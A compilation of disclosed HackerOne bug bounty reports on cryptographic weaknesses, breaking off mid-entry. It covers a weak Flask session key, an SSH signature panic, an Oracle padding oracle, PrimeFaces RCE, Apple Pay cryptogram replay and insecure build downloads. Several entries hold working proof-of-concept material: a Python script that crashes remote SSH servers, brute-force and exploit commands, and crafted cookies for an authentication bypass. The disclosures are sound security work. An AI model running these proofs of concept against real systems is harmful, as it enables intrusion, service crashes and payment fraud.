# Cryptographic Issues - Generic

_18 reports — High/Critical, disclosed_

### [elections.k8s.io uses weak session secret key, may place elections at risk](https://hackerone.com/reports/1387366)

- **Report ID:** `1387366`
- **Severity:** High
- **Weakness:** Cryptographic Issues - Generic
- **Program:** Kubernetes
- **Reporter:** @ian
- **Bounty:** 250 usd
- **Disclosed:** 2025-09-19T20:54:04.169Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
Hi there, I have been working on a new tool to detect misconfigured session signing across bug bounty programs, called CookieMonster. Many applications use stateless cookies to preserve session information (i.e. who has logged in), but many applications do not properly secure this. @nagli and I discovered that `elections.k8s.io` uses a weak Flask SECRET_KEY, literally the string `N/A`, to sign authentication cookies.

In many applications, this allows the complete compromise of the application, as you can manipulate who you are logged in as. This would be especially problematic for an election voting system. It seems, in the case of Elekto, this may not be the case as the GitHub OAuth token is injected into the session instead of a user ID, which would be hard to obtain for another user. However, this may enable weird attacks like using cross-origin request forgery with the voting or authentication flows, as we would be able to manipulate the session which contains these tokens.

Note the warning from [the Elekto source](https://github.com/elekto-io/elekto/blob/48573733858aace5bec38ee9dc73e45163518346/config.py) (this is what you have set to `N/A`):

```python
# Encryption Key
#
# This is used by the Flask server and should be set to a random character
# string, please do not deploy before doing this!.
SECRET_KEY = env('APP_KEY', 'test')
```

## PoC
As CookieMonster is not yet public, you can also use `Flask-Unsign` (`pip3 install flask-unsign[wordlist]`) to validate this:
```
% curl https://elections.k8s.io -Is | grep cookie
set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.YX-V3g.NET76NNJbweb_qagyfYl2_7TDJg; Expires=Thu, 02 Dec 2021 07:23:10 GMT; HttpOnly; Path=/

% flask-unsign -u -c "eyJfcGVybWFuZW50Ijp0cnVlfQ.YX-V3g.NET76NNJbweb_qagyfYl2_7TDJg"
[*] Session decodes to: {'_permanent': True}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 8192 attemptspdcQHNyXaB0O
'N/A'
```

## Impact

Weak secret likely allows arbitrary session manipulation

---

### [HashDoS in V8](https://hackerone.com/reports/3131758)

- **Report ID:** `3131758`
- **Severity:** High
- **Weakness:** Cryptographic Issues - Generic
- **Program:** Node.js
- **Reporter:** @sharp_edged
- **Bounty:** - usd
- **Disclosed:** 2025-07-15T22:49:53.508Z
- **CVE(s):** CVE-2025-27209

**Summary (team):**

The V8 release used in Node.js v24.0.0 has changed how string hashes are computed using rapidhash. This implementation re-introduces the HashDoS vulnerability as an attacker who can control the strings to be hashed can generate many hash collisions - an attacker can generate collisions even without knowing the hash-seed.

* This vulnerability affects Node.js v24.x users.

---

### [Improper error handling in async cryptographic operations crashes process](https://hackerone.com/reports/2817648)

- **Report ID:** `2817648`
- **Severity:** High
- **Weakness:** Cryptographic Issues - Generic
- **Program:** Node.js
- **Reporter:** @tniessen
- **Bounty:** - usd
- **Disclosed:** 2025-05-14T22:30:56.841Z
- **CVE(s):** CVE-2025-23166

**Summary (team):**

The C++ method SignTraits::DeriveBits() may incorrectly call ThrowException() based on user-supplied inputs when executing in a background thread, crashing the Node.js process. Such cryptographic operations are commonly applied to untrusted inputs. Thus, this mechanism potentially allows an adversary to remotely crash a Node.js runtime.

---

### [Signature Verification /// golang.org/x/crypto/ssh](https://hackerone.com/reports/1276384)

- **Report ID:** `1276384`
- **Severity:** High
- **Weakness:** Cryptographic Issues - Generic
- **Program:** Sifchain
- **Reporter:** @dpredrag
- **Bounty:** - usd
- **Disclosed:** 2021-12-09T17:44:54.208Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Crypto package are vulnerable to Improper Signature Verification "
An attacker can craft an ssh-ed25519 or sk-ssh-...@openssh.com public key, such that the library will panic when trying to verify a signature with it. Clients can deliver such a public key and signature to any golang.org/x/crypto/ssh server with a PublicKeyCallback, and servers can deliver them to any golang.org/x/crypto/ssh client "

Introduced through: github.com/Sifchain/sifnode@0.0.0 › golang.org/x/crypto@v0.0.0-20201016220609-9e8e0b390897
Introduced through: github.com/Sifchain/sifnode@0.0.0 › github.com/tyler-smith/go-bip39@v1.1.0 › golang.org/x/crypto@v0.0.0-20200622213623-75b288015ac9
and few more I can provide more points if needed

{F1386859}

## Steps To Reproduce:

1 . python poc.py localhost 2022 root (or x.x.x.x depends on setup)

poc.py

```
# This should cause a panic on the remote server.
#

#!/usr/bin/env python

import socket
import sys

import paramiko
from paramiko.common import cMSG_SERVICE_REQUEST, cMSG_USERAUTH_REQUEST

if len(sys.argv) != 4:
    print('./poc.py <host> <port> <user>')
    sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])
user = sys.argv[3]

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))

t = paramiko.Transport(sock)
t.start_client()

t.lock.acquire()
m = paramiko.Message()
m.add_byte(cMSG_SERVICE_REQUEST)
m.add_string("ssh-userauth")
t._send_message(m)

m = paramiko.Message()
m.add_byte(cMSG_USERAUTH_REQUEST)
m.add_string(user)
m.add_string("ssh-connection")
m.add_string('publickey')
m.add_boolean(True)
m.add_string('ssh-ed25519')

# Send an SSH key that is too short (ed25519 keys are 32 bytes)
m.add_string(b'\x00\x00\x00\x0bssh-ed25519\x00\x00\x00\x15key-that-is-too-short')

# Send an empty signature (the server won't get far enough to validate it)
m.add_string(b'\x00\x00\x00\x0bssh-ed25519\x00\x00\x00\x00')

t._send_message(m)

print('Malformed auth request sent. This should cause a panic on the remote server.')
```

This can be fixed by upgrading to golang.org/x/crypto@0.0.0-20201203163018-be400aefbc4c 

## Supporting Material/References:
https://groups.google.com/g/golang-announce/c/3L45YRc91SY
https://github.com/golang/crypto/commit/bac4c82f69751a6dd76e702d54b3ceb88adab236

## Impact

Summary

---

### [[HTAF4-213] [Pre-submission] CVE-2018-2879 (padding oracle attack in the Oracle Access Manager) at https://█████████](https://hackerone.com/reports/728110)

- **Report ID:** `728110`
- **Severity:** High
- **Weakness:** Cryptographic Issues - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @sp1d3rs
- **Bounty:** - usd
- **Disclosed:** 2021-07-29T19:43:36.746Z
- **CVE(s):** CVE-2018-2879

**Vulnerability Information:**

##Description
We were able to identify CVE-2018-2879 in Oracle Access Manager, used on the https://██████
Link to the CVE: https://nvd.nist.gov/vuln/detail/CVE-2018-2879
This vulnerability is rated critical, and may allow unauthenticated attacker with network access via HTTP to compromise Oracle Access Manager.
It's possible to conduct padding oracle attack and recover plaintext from `encquery` parameter
Materials:
https://sec-consult.com/en/blog/2018/05/oracle-access-managers-identity-crisis/

##POC
We modified https://github.com/redtimmy/OAMBuster/blob/master/oambuster.py proof-of concept for https://█████ (it required some changes, for example `gcds-consent=true` is necessary in all requests to not face with consent banner page.
Here is it:
█████████
It can be launched in the next way to simply test for padding oracle and recover plaintext:
```
oambuster.py -d https://██████████
```
The result (decrypt process can take some time, for example on the screenshot above it's not fully finished, but you can already see readable parts):
███████

This confirms that vulnerability is valid.

##Suggested fix
Apply patch & update OAM instance

## Impact

Padding oracle attack allows us to decrypt any messages. As all the encrypted messages (encquery, encreply, OAMAuthnCookie) are encrypted with the same key, we can decrypt any of these messages.
This attack can also be used to encrypt messages. So if we construct a valid authentication cookie and encrypt it with our padding oracle attack, we can pass it off as valid to the web server and perform authentication bypass. 

We will research this further and will update report with new information.

---

### [Apple Pay cryptogram replay and amount tampering](https://hackerone.com/reports/996540)

- **Report ID:** `996540`
- **Severity:** High
- **Weakness:** Cryptographic Issues - Generic
- **Program:** RBKmoney
- **Reporter:** @timyun
- **Bounty:** - usd
- **Disclosed:** 2021-03-10T18:56:58.264Z
- **CVE(s):** -

**Vulnerability Information:**

During Apple Pay in-app or on-site payments the device generates a payment cryptogram, which contains a transaction ID, encrypted payment data, etc.

This is an example of the cryptogram which the phone passes to the internet acquiring service on api.transferwise.com:

```
"token": {
				"paymentData": {
					"version": "EC_v1",
					"data": "tJ*",
					"signature": "MIAGC*",
					"header": {
						"ephemeralPublicKey": "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEPU54D0AnTNCE/rA/99aMiu10cCzW9mnA1xqhaV+pUY3cQ9oYHrtO6uXf24VrDxAwMgNeJOduroEtgAt7IAMrPA==",
						"publicKeyHash": "iGhC/O768cuRV11jvaEac1ytv9zCtsFfK6yxDzcEorI=",
						"transactionId": "fe573e4aaebd7b76e80032c0708624a108622d7f3d31389101a6ba059653a4f4"
					}
				}
```
                
Data field contains encrypted onlinePaymentCryptogram which represents "Online payment cryptogram, as defined by 3-D Secure."

Apple also requires to "Inspect the CMS signing time of the signature, as defined by section 11.3 of RFC 5652. If the time signature and the transaction time differ by more than a few minutes, it's possible that the token is a replay attack."

This is all described in:
https://developer.apple.com/library/archive/documentation/PassKit/Reference/PaymentTokenJSON/PaymentTokenJSON.html

The attack is possible due to the lack of checks during Apple Pay payments. The same cryptogram was used a few time within 24h, on the different stores (https://rbk.mn/D35rOlnep3f and https://fondchizhova.ru/node/729)

```
"token": {
				"paymentData": {
					"version": "EC_v1",
					"data": "hVr4d5Zjm5ot07QGEdKDsCW+olmb3szPC3xS4Gcjr1ulQzvefzElQYjvezCkBIvFtBFUQeOxtIy3ZQVf69nb0uJNLanZ9AFBfzN8xxy23QeCuFQWh0SkgUjc9/Lw1IRtGYrUJx2WeX+YtXP+/yzK8g0RDr1pvwHRKWOay64W+4DbemsWC8ShYk7mdfzge9urSwHeJfXK/y5hLdNvJkJfQvPu0cxkASZhVeSvz0/7ngKtnCP9DCIsIGhof+Nc30fCb4nA1asHelWOgXNKngeUYJi2gWX3bo8WcYf+65cWFjrWMro4bRzHh2VbRQpoULRjlqInPMel3ZhI3bhOVE4dVlbyLSsJYQcKwDLBSXybCsD591WAhaHdf9Wpxmb/rYSC6O55SqaBgT13MoH3xFH1O6ZRFzVjE8+2YVzZhsV9eyr/",
					"signature": "MIAGC",
					"header": {
						"ephemeralPublicKey": "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEmLnyjZMabQOikn7jEKkc92SVvMNW2xJOZLyMVXUNs52so+U0LIZ7xRjYSq6eWwpcqvdR0wJSg22gB+gjfkhUhw==",
						"publicKeyHash": "iGhC/O768cuRV11jvaEac1ytv9zCtsFfK6yxDzcEorI=",
						"transactionId": "f376400ae00b9201fa45096ad1a80f048295d41f5c4c2f5c7e06fe88141f3543"
					}
				}
```
cryptogram was used to create 2 tokens for payments on 2
 different sites:

**date: Thu, 01 Oct 2020 10:30:34 GMT**

```
{"clientInfo":{"fingerprint":"a7e21773614841122f9f3203e8ea8432","ip":"92.40.171.45"},"paymentSession":"eyJjbGllbnRJbmZvIjp7ImZpbmdlcnByaW50IjoiYTdlMjE3NzM2MTQ4NDExMjJmOWYzMjAzZThlYTg0MzIiLCJpcCI6IjkyLjQwLjE3MS40NSJ9LCJwYXltZW50U2Vzc2lvbiI6IjdZYTRsdkZEYTE5emlldXh0bGFXWEEifQ","paymentToolDetails":{"cardNumberMask":"*3064","detailsType":"PaymentToolDetailsBankCard","last4":"3064","paymentSystem":"visa","tokenProvider":"applepay"},"paymentToolToken":"v1.eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIiwia2lkIjoia2kyMjQwNVN1MVNFTHdRcTBjT21MamVNTjY1OVl1Rk8ifQ..dxiUkBowKsMkyz3N71ECxA.5XActkAUb0MH-46pEb139iNHtKyx21OherM2vENcB7vFhL-BbwKLqelsvZ-b_7ydEwXeaYy3ZeN2ScHZ8k5pZffDwUS_QZ75_zOx2nKvaK54eBdkHwNtbqh5MvTIQJaUcgaff5ppc_HWLYSUQNywmeW0wsj5DDg5tnSVucPPR6uvycohIC9IgkdgglxgH9jhNvtsLasVfHcCruD9WgAlA7k4kFm4D5Vx3EsppzKY_UpvrZ--4zFGp9-dTxhbqT4N.3YFEzU4hG-3XLosxrJ7tag"}
```
and

**date: Thu, 01 Oct 2020 10:31:51 GMT**

```
{"clientInfo":{"fingerprint":"a7e21773614841122f9f3203e8ea8432","ip":"92.40.171.40"},"paymentSession":"eyJjbGllbnRJbmZvIjp7ImZpbmdlcnByaW50IjoiYTdlMjE3NzM2MTQ4NDExMjJmOWYzMjAzZThlYTg0MzIiLCJpcCI6IjkyLjQwLjE3MS40MCJ9LCJwYXltZW50U2Vzc2lvbiI6IjdRZ1NPMm14TzU1QkxRR3k0VTFtZ3AifQ","paymentToolDetails":{"cardNumberMask":"*3064","detailsType":"PaymentToolDetailsBankCard","last4":"3064","paymentSystem":"visa","tokenProvider":"applepay"},"paymentToolToken":"v1.eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIiwia2lkIjoia2kyMjQwNVN1MVNFTHdRcTBjT21MamVNTjY1OVl1Rk8ifQ..GUWDdl9N61xwMHavh1Ug3Q.3NnV7rSCeJ_XMRHje5bYbUEFbMZe3vUCueZa1dqL8WV1zJdJ1w2512MzvhwXEPNJbI5g0zsIt-YGD9TFeKO6ISqm0QZK1Gh41LahS-FItceLu7ZS-cpeGOrzYHeWjXo5gKLpuiMdefMz9xTp8HymGz8S_gQX8rsXevVJPYZPVNU7se536e-vTvePAdVR43lKWda2F_3GMwwZRI3YyhylkBo_Ff5fC9o0yuYYJZbbPD2H4c3kkw47bfh4xAeHZ3hx.OkcqSZfsg9npMMJvI-jo1g"}
```
and

**date: Thu, 01 Oct 2020 10:33:31 GMT**

```
{"clientInfo":{"fingerprint":"a7e21773614841122f9f3203e8ea8432","ip":"92.40.171.40"},"paymentSession":"eyJjbGllbnRJbmZvIjp7ImZpbmdlcnByaW50IjoiYTdlMjE3NzM2MTQ4NDExMjJmOWYzMjAzZThlYTg0MzIiLCJpcCI6IjkyLjQwLjE3MS40MCJ9LCJwYXltZW50U2Vzc2lvbiI6IjRjdzF5Vm1GRjdjd1hOUmluV3F2ODEifQ","paymentToolDetails":{"cardNumberMask":"************3064","detailsType":"PaymentToolDetailsBankCard","last4":"3064","paymentSystem":"visa","tokenProvider":"applepay"},"paymentToolToken":"v1.eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIiwia2lkIjoia2kyMjQwNVN1MVNFTHdRcTBjT21MamVNTjY1OVl1Rk8ifQ..jOVdbK-IGoMcZzTzo5FPnw.MgVNAkhBHHreNKKw7aaP19_pwDDaFvuYkAEZhiHdFzbTsDFbikNCnPoDeR2PRndAgBSKPYPC-JrUYzEj3jBjHu9_XbRhOL0wunTzXpCFWaoyWX9U4QkWyTAM-g6CIQU4eTzpLu7SJAAUU1KnUYyXOK6LMApxq3FN_s3T_5jnejBwWh2IHHPgiaUxMA7SCjb4XHV5RI3CBqXow6AHeEP4kvRjWFGv8nqrL3oWPkpBWUcOA_Ihe-P1AgZ82kUrUP66.w4cX0ohp96B776qws1yHAQ"}                
```

RBK Money also doesn't check what price has been shown on the Apple Pay payment sheet and has been signed by the customer, but only the price that is sent on the https://api.rbk.money/v2/processing/invoice-templates/[id]/invoices
request. So stolen cryptograms can be used for much larger/arbitrary payments.

```
{
	"clientInfo": {
		"fingerprint": "a7e21773614841122f9f3203e8ea8432",
		"ip": "92.237.66.14"
	},
	"paymentSession": "eyJjbGllbnRJbmZvIjp7ImZpbmdlcnByaW50IjoiYTdlMjE3NzM2MTQ4NDExMjJmOWYzMjAzZThlYTg0MzIiLCJpcCI6IjkyLjIzNy42Ni4xNCJ9LCJwYXltZW50U2Vzc2lvbiI6IjVSN2lKbkkxalAyc1g1eEhRdlBkQ20ifQ",
	"paymentToolDetails": {
		"cardNumberMask": "************8631",
		"detailsType": "PaymentToolDetailsBankCard",
		"last4": "8631",
		"paymentSystem": "mastercard",
		"tokenProvider": "applepay"
	},
	"paymentToolToken": "v1.eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIiwia2lkIjoia2kyMjQwNVN1MVNFTHdRcTBjT21MamVNTjY1OVl1Rk8ifQ..j1q3rFfHWzFtxDNzU1fBBA.6cszZeR2iDsUwz2--hBiR0Z_pK2gsOjd4dmTjssTkZZa6Lzz3gcjyFeSmzYsQgd2mqfAjvP4r_1gNsK1FQC4tAaGeAixJiLnWqjeY1-F_0wac5kyvWB70Q9ofjWvoo9no3Bwe21Utc42ByO9NJRHDk4H58AvfRbRZAA-z76zsFTyTK-eWQl06A3LR8gJIfgRWSBlRFye72UsKH7v2oLQNKSds9UamD_1tze0UN0srh2mGTA7m5raCUUnxL947W-Rhd7TOw.dzobn5l6XWSQX77A9WPiiw"
}
```
Has shown a 100,00 transaction, however it was used to sign a 110,00 payment.

To implement this attack, hackers can follow the e-skimming attacks similar to Magecart. After infecting user device (Macbook) or rbk.money resources, even the card is fully virtual and data is encrypted, it still can be used multiple times for committing fraud.

*Notice: the original research was presented in 2017 https://www.blackhat.com/docs/us-17/thursday/us-17-Yunusov-The-Future-Of-Applepwn-How-To-Save-Your-Money.pdf since that this attack is not possible with MC cards due to the fact that MC has necessary controls within their network to decline replay attacks. So this attack is possible only with Visa cards.*

## Impact

Stolen Apple Pay cryptogram can be used many times in the future for making fraudulent payments for any RBK Money merchant.

---

### [Some build dependencies are downloaded over an insecure channel (without subsequent integrity checks)](https://hackerone.com/reports/1039504)

- **Report ID:** `1039504`
- **Severity:** High
- **Weakness:** Cryptographic Issues - Generic
- **Program:** Internet Bug Bounty
- **Reporter:** @jub0bs
- **Bounty:** 100 usd
- **Disclosed:** 2020-12-04T18:57:34.720Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

Build jobs [`mingw64 | openssl-1.1.1d`](https://github.com/OpenVPN/openvpn/blob/master/.travis.yml#L87) and [`mingw32 | openssl-1.0.2u`](https://github.com/OpenVPN/openvpn/blob/master/.travis.yml#L91) download dependencies from `build.openvpn.net` and `www.oberhumer.com`over an insecure channel (`http`, _not_ `https`) and do not check their integrity in any way.

This opens the door to person-in-the-middle attacks, whereby an attacker controlling an intermediate node on the network path between Travis CI's build servers and those two servers could manipulate traffic and inject his own malicious code into the artifacts produced by the two jobs in question.

## Steps To Reproduce:

The `install` phase of the `.travis.yml` file [unconditionally executes](https://github.com/openvpn/openvpn/blob/master/.travis.yml#L120) the `.travis/build-deps.sh` script. If the following three conditions are satisfied,

1. [the OS be other than `windows`](https://github.com/OpenVPN/openvpn/blob/master/.travis/build-deps.sh#L4),
2. [environment variable `SSLLIB` be set to `openssl`](https://github.com/OpenVPN/openvpn/blob/master/.travis/build-deps.sh#L148), and
3. [environment variable `CHOST` be set](https://github.com/OpenVPN/openvpn/blob/master/.travis/build-deps.sh#L161),

(they are only satisfied for build jobs [`mingw64 | openssl-1.1.1d`](https://github.com/OpenVPN/openvpn/blob/master/.travis.yml#L87) and [`mingw32 | openssl-1.0.2u`](https://github.com/OpenVPN/openvpn/blob/master/.travis.yml#L91)), then shell functions `download_tap_windows` and `download_lzo` are executed [one](https://github.com/OpenVPN/openvpn/blob/master/.travis/build-deps.sh#L162) after the [other](https://github.com/OpenVPN/openvpn/blob/master/.travis/build-deps.sh#L165).

Shell functions `download_tap_windows` and `download_lzo` are defined above ([here](https://github.com/OpenVPN/openvpn/blob/master/.travis/build-deps.sh#L18) and [here](https://github.com/OpenVPN/openvpn/blob/master/.travis/build-deps.sh#L18), respectively) in `.travis/build-deps.sh`:

```shell
download_tap_windows () {
    if [ ! -f "download-cache/tap-windows-${TAP_WINDOWS_VERSION}.zip" ]; then
       wget -P download-cache/ \
           "http://build.openvpn.net/downloads/releases/tap-windows-${TAP_WINDOWS_VERSION}.zip"
    fi
}

download_lzo () {
    if [ ! -f "download-cache/lzo-${LZO_VERSION}.tar.gz" ]; then
        wget -P download-cache/ \
            "http://www.oberhumer.com/opensource/lzo/download/lzo-${LZO_VERSION}.tar.gz"
    fi
}
```

Note that both `wget` commands use `http` as opposed to `https` ( though using `https` is readily possible, since both  domains `build.openvpn.net` and `www.oberhumer.com` support `https` and have valid TLS certificates) .

## Supporting Material/References:

To be added in a comment below when my custom build of OpenVPN/openvpn finishes on travis-ci.org (it's taking a while...).

## Impact

The two dependencies are downloaded over an insecure channel and, therefore, can be intercepted and tampered with by a person in the middle (controlling an intermediate node on the network path between Travis CI's build servers).

Moreover, as no integrity checks seem to be performed after download, a person-in-the-middle attack would go undetected and could seriously compromise the integrity of the artifacts produced by those two build jobs.

Please do not dismiss the possibility of such an attack too quickly, as it is [not as far-fetched as one would think](https://medium.com/bugbountywriteup/want-to-take-over-the-java-ecosystem-all-you-need-is-a-mitm-1fc329d898fb).

---

### [RCE (Remote code execution) in one of DoD's websites ](https://hackerone.com/reports/874924)

- **Report ID:** `874924`
- **Severity:** Critical
- **Weakness:** Cryptographic Issues - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @pwn1um
- **Bounty:** - usd
- **Disclosed:** 2020-07-30T17:47:50.131Z
- **CVE(s):** CVE-2017-1000486

**Vulnerability Information:**

**Summary:**
The targeted website is vulnerable to CVE-2017-1000486, by only running command was (whoami) to prove that the RCE exist has been run successfully on the target
**Description:**
The target uses a vulnerable version of primefaces : Primetek Primefaces 5.x, that is vulnerable to a weak encryption flaw resulting in remote code execution
## Impact
Critical
## Step-by-step Reproduction Instructions
Using the following exploit : https://github.com/pimps/CVE-2017-1000486
1. python primefaces.py████████/

## Product, Version, and Configuration (If applicable)
Primefaces 5.3.6
## Suggested Mitigation/Remediation Actions
Primefaces has to be updated to a newer version

## Impact

An attacker could execute remote codes on the target system, that could impact all of the CIA triad

---

### [█████████ - Insecure download cookie generation allows bypass of CAC authentication, access to deleted and locked files](https://hackerone.com/reports/496326)

- **Report ID:** `496326`
- **Severity:** Critical
- **Weakness:** Cryptographic Issues - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @cablej_dds
- **Bounty:** - usd
- **Disclosed:** 2020-05-11T16:47:33.285Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**

To download a file, ████ directs users to `/██████████/Download.aspx` and sets a cookie authenticating the download. The cookie looks like this:

```
pickup=Subject=&PackageID=MTU4NDgzMTU=███
```

If an attacker can generate this cookie, this allows downloading a file. As it turns out, the generation of the cookie is fairly straightforward and requires no server-side key, only a file ID and its associated password. The components are:

1. The file ID, base 64 encoded, followed by a dash
2. The SHA512 hash of the plaintext file ID, base 64 encoded
3. The secret key of the package (as sent in the email), base 64 encoded, followed by a dash
4. The SHA2512 hash of the secret key, base 64 encoded

By generating a cookie using this format, an attacker can accomplish the following:

1. Bypass CAC-enforced files.
2. Bypass deleted files (tested when a user deletes their package). Untested if this allows accessing historical files.
3. Bypass "locked" files that have already been downloaded.

For instance, after attempting to download a deleted package on █████, █████ displays the following error:

> The package Is no longer available For download. The file(s) has been permanently deleted from ███████. You will have To contact the sender And ask them To upload the file(s) again. 

However, this is not true. By making a crafted request to `/█████████/Download.aspx` given the above cookies, a user can still download deleted files. This may also apply to past files, meaning that all previous uploaded files may not be deleted. I will test this when files I have submitted expire.

## Impact

Significant bypasses to █████████ security controls, including:

- Bypass CAC protections
- Download files that ███ says have been deleted from the file system
- Download locked files that have already been downloaded

It is unclear at the moment if this also applies to files that have expired after a set period of time. I will retest when files I have uploaded have expired.

## Step-by-step Reproduction Instructions

1. Visit https://███████/██████/pickupfiles.aspx?id=15849581, a file I uploaded and deleted.
2. Try the password `█████████`. Observe that an error is displayed that the file is deleted.
3. As described above, generate the following cookie, based on the file ID and password.

```
pickup=Subject=&PackageID=MTU4NDk1ODE=█████████
```

4. Make the following GET request with the cookie:

```
GET /████████/Download.aspx?PackageID=15849581&FileName=dog.jpg HTTP/1.1
Host: ███████
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: https://█████/██████████/pickupfiles.aspx?id=15849581
Accept-Language: en-US,en;q=0.9
Cookie:  pickup=Subject=&PackageID=MTU4NDk1ODE=████

```

5. Observe that the file is returned, demonstrating that it has not been deleted.

This also has been tested with CAC-enforced files and files that are "locked" due to already having been downloaded.

## Impact

.

---

### [[Twitter Open Source] Releases were & are built/executed/tested/released in the context of insecure/untrusted code](https://hackerone.com/reports/505007)

- **Report ID:** `505007`
- **Severity:** High
- **Weakness:** Cryptographic Issues - Generic
- **Program:** X / xAI
- **Reporter:** @jlleitschuh
- **Bounty:** 280 usd
- **Disclosed:** 2019-12-13T21:08:47.178Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**

[CWE-829: Inclusion of Functionality from Untrusted Control Sphere](https://cwe.mitre.org/data/definitions/829.html)
[CWE-494: Download of Code Without Integrity Check](https://cwe.mitre.org/data/definitions/494.html)

Twitter maintains several Open Source Projects under the [Twitter GitHub organization](https://github.com/twitter). These projects contain build files that indicate that some of these projects are resolving dependencies over HTTP instead of HTTPS. This allows these artifacts to be potentially MITMed to maliciously compromise them and infect the build artifacts that are produced. Additionally, if any of these JARs or other dependencies were compromised, any developers or production servers using these could continue to be infected past updating to fix this.

**Description:**

This attack leverages the build infrastructure loading dependencies over HTTP without any other sort of integrity check to allow them to be maliciously compromised.

### This isn't just theoretical
POC code has existed since 2014 to maliciously compromise a JAR file inflight.
See:
* https://max.computer/blog/how-to-take-over-the-computer-of-any-java-or-clojure-or-scala-developer/
* https://github.com/mveytsman/dilettante

### MITM Attacks Increasingly Common
See:
* https://serverfault.com/a/153065
* https://security.stackexchange.com/a/12050
* [Comcast continues to inject its own code into websites you visit](https://thenextweb.com/insights/2017/12/11/comcast-continues-to-inject-its-own-code-into-websites-you-visit/#) (over HTTP)

### Source Locations

#### Insecure Download

##### Scrooge
  - https://github.com/twitter/scrooge/blob/b8fb8b563cb152b5d46c2ec8a24c9c134cdde140/project/plugins.sbt#L1-L6
 
##### Tormentia
 - https://github.com/twitter/tormenta/blob/50cf4773fd188a6ae82ab87e306a58c064cced1e/project/plugins.sbt#L1-L3

##### Scalding
 - https://github.com/twitter/scalding/blob/19429900e9fcdaa5c38160f0b68b579aac3f4604/project/plugins.sbt#L1-L7

##### Diffy
 - https://github.com/twitter/diffy/blob/7894459430d27d184d3663e0570f535a93fa61c6/project/plugins.sbt#L3

##### Bijection
 - https://github.com/twitter/bijection/blob/11c8325bb734bb3bd36d8d7ac6dd1dd48d82f7e3/project/plugins.sbt#L2

##### Algebird
 - https://github.com/twitter/algebird/blob/01f989f4ad534c1450ab0982669393ba1817a6d1/project/plugins.sbt#L1-L5

##### Hdfs-Du
 - https://github.com/twitter/hdfs-du/blob/5caaa0cf117ed1ebbe873ec1e8302a535bd0bc5d/pom.xml#L64-L75

##### Iago
 - https://github.com/twitter/iago/blob/019a4adfbfa913e6307cdc5a589089e95cfb6285/examples/echo/pom.xml#L17-L28

##### Ambrose
- https://github.com/twitter/ambrose/blob/da7bcb932c418c157d9c372a4ca5f1884b874d78/cascading/pom.xml#L14-L19
- https://github.com/twitter/ambrose/blob/da7bcb932c418c157d9c372a4ca5f1884b874d78/scalding/pom.xml#L22-L27

###### BookKeeper
 - https://github.com/twitter/bookkeeper/blob/91c85ab8350dfc00c2bc07f0bed338ce4d87b2f6/bookkeeper-stats-providers/twitter-finagle-provider/pom.xml#L48-L53

###### Elephant-Bird

- https://github.com/twitter/elephant-bird/blob/62642c935198aa0ff968f48669c7e654b42dfbf0/cascading3/pom.xml#L13-L18

###### JOAuth
- https://github.com/twitter/joauth/blob/b4f6afb6be79ecb0bb8d04c76b17cfa51de4ffab/project/plugins/Plugins.scala#L10-L16

###### Ect...

This list is not exaustive, I just wanted to come up with examples so the Twitter security team could get a general sense of what they are looking for.

Here are the GitHub queries I used to find these:
 - [SBT Builds with Resolvers over HTTP](https://github.com/search?q=org%3Atwitter+resolvers+http%3A%2F%2F&type=Code)
 - [Maven POM files with Repositories over HTTP](https://github.com/search?l=Maven+POM&p=2&q=org%3Atwitter+repositories+http%3A%2F%2F&type=Code)

**WARNING!** If any of these builds are using a shared or reused `~/.gradle`, `~/.m2` or whatever SBT uses as an artifact cache between builds and any of these downloads were maliciously compromised, the compromised jar may remain inside of cache directory and continue to be used in future builds.

### Fix and Public Disclosure

At a minimum, all of these code locations where artifacts are downloaded from an untrusted source needs to be fixed. Previous releases should be rebuilt with the fix applied. The checksum of the released artifacts and artifacts built in a trusted environment should be made. If the checksums match, you can be certain that they weren't compromised.

If the checksums don't match, indicating a compromised artifact, CVE numbers need to be issued for the potentially malicious artifacts.

The ability to check if checksums match assume that these projects have [reproducible builds](https://en.wikipedia.org/wiki/Reproducible_builds).

## Steps To Reproduce:

  1. Cone the Impacted Project
  2. Change this line in Dilettante so it is targeting the repository used in the build.
       https://github.com/mveytsman/dilettante/blob/master/dilettante.py#L143
  3. Start Dilettante on your local machine.
  4. Proxy the HTTP traffic for the build through Dilettante
  5. Execute the Build's tests.
  6. You should be greeted with the image of a cat.


## Other Places to Look

Given how widely I'm finding this vulnerablity externally to Twitter, I'd advise that the Twitter Security team take some time to also analize their internal infrastructure for similar vulnerabilities.

**This responsible disclosure follows [Google's 90-day vulnerability disclosure policy](https://www.google.com/about/appsecurity/) (I'm not an employee of Google, I just like their policy).**

## Impact

By insecurely downloading code over an untrusted connection HTTP and executing the untrusted code inside of these JAR files as part of the unit/integration tests before a release opens these artifacts up to being maliciously compromised.

Remote code execution on a production server. Malicious compromise of build artifacts.

---

### [Critical vulnerability in JSON Web Encryption (JWE) - RFC 7516 Invalid Curve attack](https://hackerone.com/reports/213437)

- **Report ID:** `213437`
- **Severity:** High
- **Weakness:** Cryptographic Issues - Generic
- **Program:** Internet Bug Bounty
- **Reporter:** @asanso
- **Bounty:** 1000 usd
- **Disclosed:** 2019-11-12T09:45:23.549Z
